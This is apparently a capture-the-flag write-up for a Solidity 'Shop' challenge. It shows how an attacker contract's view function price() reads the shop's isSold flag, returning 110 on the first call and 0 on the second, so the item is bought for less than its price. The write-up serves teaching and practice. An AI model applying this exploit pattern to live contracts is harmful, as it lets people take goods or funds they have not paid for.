> Сan you get the item from the shop for less than the price asked?

## Faking it until you take it

This challenge is quite similar to "elevator":

```solidity
if (_buyer.price() >= price && !isSold) {
    isSold = true;
    price = _buyer.price();
}
```

The aim is for the buyer contract to return any price on the first call and then change its answer on the second.

However, this time the interface for the caller specifies that `price` is a view:

```solidity
function price() external view returns (uint);
```

So our implementation cannot change its state between calls.
So a function similar to the solution of "elevator" wouldn't work because it is not a view:

```solidity
function price() external returns (uint) {
    flip += 1;
    return (flip % 2) * 110;
}
```

However the state of the `Shop` contract changes between the calls.
This can be used to change the price at the right moment:

```solidity
function price() external view returns (uint) {
    bool sold = Shop(msg.sender).isSold();
    return sold ? 0 : 110;
}
```
